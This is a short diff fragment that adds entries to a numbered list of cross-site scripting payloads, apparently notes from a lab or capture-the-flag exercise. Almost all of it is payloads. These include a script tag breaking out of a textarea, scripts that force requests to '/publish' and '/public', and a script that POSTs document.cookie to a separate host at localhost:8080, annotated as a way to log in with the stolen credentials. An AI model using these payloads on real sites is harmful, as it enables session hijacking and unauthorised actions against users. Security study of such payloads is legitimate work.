@@ -77,3 +77,7 @@ except Exception as e:
       </textarea><script>alert("PWNED")</script>
     XSS 5 
       <script>fetch("/publish")</script>
+    XSS 6
+      <script>fetch("/public", {method: "POST"});</script>
+    XSS 7
+      <script>fetch("http://localhost:8080", {method: "POST", body: document.cookie});</script> -> login with creds
